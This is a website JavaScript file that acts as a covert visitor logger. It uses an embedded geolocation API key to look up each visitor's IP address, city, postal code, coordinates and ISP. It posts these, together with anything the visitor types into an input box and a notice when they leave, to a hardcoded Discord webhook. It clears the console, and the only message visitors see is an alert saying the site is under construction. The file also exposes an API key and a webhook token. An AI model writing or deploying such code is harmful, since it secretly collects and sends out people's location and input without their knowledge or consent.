let apiKey = "4d377cdec65941ea90e60edc9febe199";

function join() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1062938293005713479/cYR9p1_Yz3mewwWxrROzRAZxqSjgqx2NtOMA9JD5xETUh2a70K6r6AHTRAgJ0yx8iQW0")
    request.setRequestHeader('Content-type', 'application/json');
    var uwu = {
        title: "hiiii man",
        description: "hey someone entered the website the creater is to lazy to log their ip.",
    }
    const params = {
        username: "spider man",
        embeds: [ uwu ]
    }

    request.send(JSON.stringify(params));
    console.clear()
};

function tester(){
    alert("hi im still working on this website sorry for the inconvience.")
    const input = document.querySelector("#lol");
    //input.value = "";
    $.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function(data) {
        //console.log("Hi and Welcome!");
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1062938293005713479/cYR9p1_Yz3mewwWxrROzRAZxqSjgqx2NtOMA9JD5xETUh2a70K6r6AHTRAgJ0yx8iQW0")
        request.setRequestHeader('Content-type', 'application/json');
        //var fields = JSON.stringify(data, null, 2)

        var uwulol = {
            title: "heyyyyyyyy i got someone's ip :) :white_check_mark:",
            thumbnail: {
                url: 'https://images.chesscomfiles.com/uploads/v1/blog/710669.7af3f2c9.5000x5000o.8dd5e74456c4.png',
            },
            description: `
            ip_address: ${data.ip_address}\n
            city: ${data.city}\n
            city_geoname_id: ${data.city_geoname_id}\n
            region: ${data.region}\n
            region_iso_code: ${data.region_iso_code}\n
            geoname_id: ${data.geoname_id}\n
            postal_code: ${data.postal_code}\n
            country: ${data.country}\n
            country_code: ${data.country_code}\n
            country_geoname_id: ${data.country_geoname_id}\n
            country_is_eu: ${data.country_is_eu}\n
            continent: ${data.continent}\n
            continent_code: ${data.continent_code}\n
            continent_geoname_id: ${data.continent_geoname_id}\n
            longitude: ${data.longitude}\n
            latitude: ${data.latitude}\n
            current_time: ${data.timezone.current_time}\n
            connection_type: ${data.connection.connection_type}\n
            isp_name: ${data.connection.isp_name}\n
            organization_name: ${data.connection.organization_name}\n`,
            //description: JSON.stringify(data, null, 2)
            timestamp: new Date().toISOString()
        }

        const params = {
            username: "spider man",
            embeds: [ uwulol ]
        }
        request.send(JSON.stringify(params));
        //console.clear() //this is temp i will add a try catch statement later
    });
}

function uwu(){
    const button = document.querySelector("button");
    const input = document.querySelector("#lol");

    button.addEventListener("click", () => {
        const inputValue = input.value;
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1062938293005713479/cYR9p1_Yz3mewwWxrROzRAZxqSjgqx2NtOMA9JD5xETUh2a70K6r6AHTRAgJ0yx8iQW0")
        request.setRequestHeader('Content-type', 'application/json');
        var uwuchan = {
            title: "here is what someone typed.",
            description: `**-${inputValue}**`
        }
        const params = {
            username: "spider man",
            embeds: [ uwuchan ]
        }
        request.send(JSON.stringify(params));
    });
}

window.addEventListener("beforeunload", function (e) {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1062938293005713479/cYR9p1_Yz3mewwWxrROzRAZxqSjgqx2NtOMA9JD5xETUh2a70K6r6AHTRAgJ0yx8iQW0")
    request.setRequestHeader('Content-type', 'application/json');
    var data = {
      title: "User has left the website",
      description: "The user has left the website."
    }
    const params = {
      username: "spider man",
      embeds: [data]
    }
    request.send(JSON.stringify(params));
  });